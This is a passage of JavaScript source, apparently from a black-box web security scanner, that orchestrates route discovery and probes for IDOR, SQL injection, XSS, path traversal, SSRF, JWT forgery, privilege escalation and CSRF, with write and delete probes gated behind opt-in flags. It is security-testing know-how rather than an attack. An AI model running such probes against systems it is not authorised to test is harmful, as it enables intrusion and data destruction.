    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.ERROR,
      message: `黑盒目标不可达：${baseUrl}（${health.error ?? "连接失败"}）`,
      phase: "blackbox",
      data: { error: health.error ?? null },
    });
    return {
      routes: [],
      maxRoutes: routeCap,
      probeCap,
      openapiFound: false,
      openapiRouteCount: 0,
      frontendRouteCount: 0,
      frontendScripts: 0,
      findings: [],
      evidence: [],
      summary: summarize([], [], { attempted: false, ok: false, path: null, identities: [] }),
      rateLimited: false,
      reachable: false,
      login: null,
      coverage: [],
      attackPlan: null,
      configuredMutation: !!options.allowMutation,
      configuredDestructive: !!options.allowDestructive,
    };
  }

  const openapiFound = await discoverOpenapi(ctx, baseUrl);
  const openapi = openapiRoutes(openapiFound, routeCap);
  const brute = await bruteRoutes(ctx, baseUrl);
  const frontend = await discoverFrontendRoutes(ctx, baseUrl, { html: health.body });
  const routes = mergeRoutes(routeCap, openapi, frontend.routes, brute);
  const surface = await probeAttackSurface(ctx, baseUrl);
  const rate = await checkRateLimit(ctx, baseUrl);
  const rateLimited = rate.limited;

  const login = await tryLogin(ctx, baseUrl, options.config ?? {});
  const ADMIN_ROLE = /^(?:.*[-_])?(?:admin|administrator|superuser|root|staff|manager|support)$/i;
  const admins = login.identities.filter((i) => ADMIN_ROLE.test(String(i.role ?? "")));
  const users = login.identities.filter((i) => !ADMIN_ROLE.test(String(i.role ?? "")));
  const pair = users.length >= 2 ? { attacker: users[0], victim: users[1] } : null;
  if (!pair) {
    ctx.emit({
      kind: "identity",
      severity: SEVERITY.WARN,
      message: "黑盒模式：可用普通身份不足 2 个，跳过跨用户越权（IDOR）类用例",
      data: { identities: login.identities.map((i) => i.name) },
    });
  }

  const who = pair ? pair.attacker.name : users[0]?.name ?? null;
  const allowDestructive = !!options.allowDestructive;
  const probes = [];
  // 覆盖清单要如实反映「这一轮真的打过什么」，报告与 GUI 直接照它写口径
  const coverage = [
    "路由发现",
    "敏感文件/调试端点",
    "限流观察",
    "未认证读取",
    "SQL 注入（字符串+数字语境）",
    "路径穿越（含编码绕过）",
    "CORS 配置（跨源读取）",
    "反射型 XSS（HTML 上下文）",
  ];

  // 攻击规划（M2）：预算只够打前 probeCap 条路由时，让模型在「引擎已发现但未获预算」的
  // 路由里挑编号。模型不参与怎么打、也不参与判定，载荷与判据仍是引擎生成。
  const planCfg = planBudget({ config: options.config });
  const planning = attackPlanEnabled(ctx, options);
  const planRounds = [];
  let attackRoutes = routes;
  if (planning) {
    const r1 = await runAttackPlanner(ctx, {
      routes,
      probeCap,
      round: 1,
      budget: planCfg,
      getToken: options.llm?.getToken,
      model: options.llm?.model ?? null,
      chatImpl: options.llm?.chatImpl,
    });
    planRounds.push(r1);
    recordPlan(ctx, r1);
    if (!r1.fallback && r1.picks.length) attackRoutes = r1.ordered;
  }

  probes.push(...(await probeUnauthRead(ctx, baseUrl, attackRoutes, probeCap)));
  if (pair) {
    coverage.push("跨用户读取（IDOR）");
    probes.push(...(await probeIdor(ctx, baseUrl, attackRoutes, pair, probeCap)));
  }

  // 第二轮复排：读类证据已经落地，让模型据此把剩下的预算分给还没打过的路由
  if (planning && planCfg.rounds >= 2) {
    const r2 = await runAttackPlanner(ctx, {
      routes: attackRoutes,
      probeCap,
      round: 2,
      records: probes,
      budget: planCfg,
      getToken: options.llm?.getToken,
      model: options.llm?.model ?? null,
      chatImpl: options.llm?.chatImpl,
    });
    planRounds.push(r2);
    recordPlan(ctx, r2);
    if (!r2.fallback && r2.picks.length) attackRoutes = r2.ordered;
  }

  // 注入/穿越没有登录身份也要跑：可注入的公开端点不需要会话就能读库
  probes.push(...(await probeCors(ctx, baseUrl, attackRoutes, who, probeCap)));
  probes.push(...(await probeXss(ctx, baseUrl, attackRoutes, who, probeCap)));
  probes.push(...(await probeSqli(ctx, baseUrl, attackRoutes, who, probeCap)));
  probes.push(...(await probeTraversal(ctx, baseUrl, who, attackRoutes)));
  coverage.push("SSRF（本机回连 canary）", "JWT 伪造令牌");
  probes.push(...(await probeSsrf(ctx, baseUrl, attackRoutes, who)));
  probes.push(...(await probeJwt(ctx, baseUrl, attackRoutes)));
  if (login.ok) {
    coverage.push("垂直越权（管理端点）");
    probes.push(
      ...(await probeVerticalEscalation(ctx, baseUrl, attackRoutes, { user: users[0] ?? null, admin: admins[0] ?? null }, probeCap))
    );
  }
  if (pair && options.allowMutation) {
    const methods = allowDestructive ? ["PUT", "PATCH", "DELETE"] : ["PUT", "PATCH"];
    coverage.push("跨用户修改（PUT/PATCH）", "未认证写入");
    if (allowDestructive) coverage.push("跨用户删除（DELETE）");
    probes.push(...(await probeWriteIdor(ctx, baseUrl, attackRoutes, pair, { methods, destructive: allowDestructive }, probeCap)));
    probes.push(...(await probeAnonymousWrite(ctx, baseUrl, attackRoutes, { victim: pair.victim })));
    coverage.push("文件上传（主动内容）", "业务逻辑跳步/并发双花");
    probes.push(...(await probeUpload(ctx, baseUrl, attackRoutes, pair.attacker.name)));
    probes.push(...(await probeBizLogic(ctx, baseUrl, attackRoutes, { identity: pair.attacker.name, destructive: allowDestructive })));
    if (ctx.loginConfig?.cookieAuth === true) {
      coverage.push("CSRF（Cookie 会话）");
      probes.push(...(await probeCsrf(ctx, baseUrl, attackRoutes, { victim: pair.victim }, probeCap)));
    } else {
      ctx.emit({
        kind: "discovery",
        severity: SEVERITY.INFO,
        message: "CSRF 探测跳过：本轮登录使用 Bearer 令牌（浏览器不会跨站自动携带），CSRF 只对 Cookie 会话有意义",
        data: { cookieAuth: false },
      });
    }
  } else if (pair) {
    ctx.emit({
      kind: "discovery",
      severity: SEVERITY.INFO,
      message:
        "写操作类越权探测（跨用户 PUT/PATCH/DELETE、匿名写入）默认关闭（会修改甚至销毁目标数据）；如需启用，在 guardbuild.json 设 blackbox.allowMutation=true 或环境变量 GUARDBUILD_BLACKBOX_MUTATE=1（DELETE 还需 blackbox.allowDestructive=true / GUARDBUILD_BLACKBOX_DELETE=1）",
      data: { allowMutation: false, allowDestructive: false },
    });
  }

  const attackPlan = planRounds.length
    ? {
        enabled: true,
        model: planRounds.map((r) => r.model).find(Boolean) ?? null,
        llmCalls: planRounds.filter((r) => r.asked).length,
        probeCap,
        rounds: planRounds.map((r) => ({
          round: r.round,
          asked: !!r.asked,
          menuSize: r.menuSize,
          coveredCount: r.coveredCount,
          picks: r.picks ?? [],
          ignored: r.ignored ?? [],
          invalid: r.invalid ?? [],
          fallback: r.fallback ?? null,
          rejected: r.rejected ? String(r.rejected).slice(0, 200) : null,
          durationMs: r.durationMs,
          usage: r.usage ?? null,
        })),
        appliedPicks: planRounds.flatMap((r) => r.picks ?? []),
        ignoredFields: [...new Set(planRounds.flatMap((r) => r.ignored ?? []))],
      }
    : null;

  const records = [...surface, ...probes];
  for (const rec of records) {
    try {
      ctx.db.insertEvidence({
        ...rec,
        request: { ...rec.request, headers: rec.request.headers },
        response: rec.response,
      });
    } catch {
      /* 证据落库失败不影响扫描 */
    }
  }

  const findings = records
    .filter((r) => r.verdict === VERDICT.VULNERABLE)
    .map((r) => ({
      type: r.caseName,
      method: r.method,
      path: r.endpoint,
      severity: "high",
      detail: r.actual,
      evidenceId: r.id,
      evidenceGrade: r.evidenceGrade,
      curl: buildCurl(r, baseUrl),
    }));

  const summary = summarize(records, routes, {
    attempted: true,
    ok: login.ok,
    path: login.path,
    identities: login.identities.map((i) => ({ name: i.name, role: i.role ?? "user", id: i.user?.id ?? null })),
  });
  return {
    routes,
    maxRoutes: routeCap,
    probeCap,
    openapiFound: !!openapiFound,
    openapiRouteCount: openapi.length,
    frontendRouteCount: frontend.routes.length,
    frontendScripts: frontend.scripts,
    frontendScriptsFetched: frontend.fetched,
    findings,
    evidence: records,
    summary,
    rateLimited,
    reachable: rate.reachable,
    login: summary.login,
    coverage,
    attackPlan,
    configuredMutation: !!options.allowMutation,
    configuredDestructive: !!options.allowDestructive,
  };
}

function buildCurl(rec, baseUrl) {
  const url = `${baseUrl.replace(/\/+$/, "")}${rec.endpoint}`;
  const auth = rec.identity && rec.identity !== "(anonymous)" ? `-H "Authorization: Bearer <${rec.identity}_token>" ` : "";
  const body = rec.request.body
    ? `-H "Content-Type: application/json" -d '${typeof rec.request.body === "string" ? rec.request.body : JSON.stringify(rec.request.body)}' `
    : "";
  return `curl -X ${rec.method} ${auth}${body}${url}`.replace(/\s+/g, " ").trim();
}
